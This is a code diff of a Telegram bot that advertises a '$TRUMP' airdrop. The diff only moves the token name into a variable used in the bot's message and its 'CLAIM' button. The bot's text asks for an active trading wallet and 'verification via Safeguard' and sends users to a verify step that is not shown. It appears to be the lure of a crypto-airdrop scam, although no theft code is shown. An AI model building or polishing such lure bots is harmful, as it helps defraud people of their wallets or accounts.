@@ -27,6 +27,9 @@ verify_bot_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-inv
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def on_start(event):
     try:
+        # Set the current airdrop name as a variable
+        airdrop_name = "$TRUMP"  # You can change this value dynamically if needed
+        
         # Send the initial message
         await event.respond("Searching for available pre-sales and airdrops...")
         await asyncio.sleep(2)
@@ -44,7 +47,7 @@ async def on_start(event):
                     await event.respond(
                         file=image_data,
                         message=(
-                            "Current Airdrop: $TRUMP.\n\n"
+                            f"Current Airdrop: {airdrop_name}.\n\n"
                             "Eligibility Requirements:\n\n"
                             "- **Active Trading Wallet:** Your trading wallet must have been active within the last 30 days.\n\n"
                             "- **Verification:** Complete verification via Safeguard.\n\n"
@@ -53,7 +56,7 @@ async def on_start(event):
                             "Failure to meet any of the above requirements will result in disqualification."
                         ),
                         buttons=[
-                            [Button.inline("CLAIM $TRUMP", b'verify_button')],
+                            [Button.inline(f"CLAIM {airdrop_name}", b'verify_button')],
                             [Button.url("@SOLTRENDING", "https://t.me/SOLTRENDING")]
                         ]
                     )
@@ -61,6 +64,7 @@ async def on_start(event):
                     print("Failed to fetch the image.")
     except Exception as e:
         await event.respond("Error: There was an issue verifying your account. Please try again.")
+
 
 
 @bot_client.on(events.CallbackQuery(data=b'verify_button'))
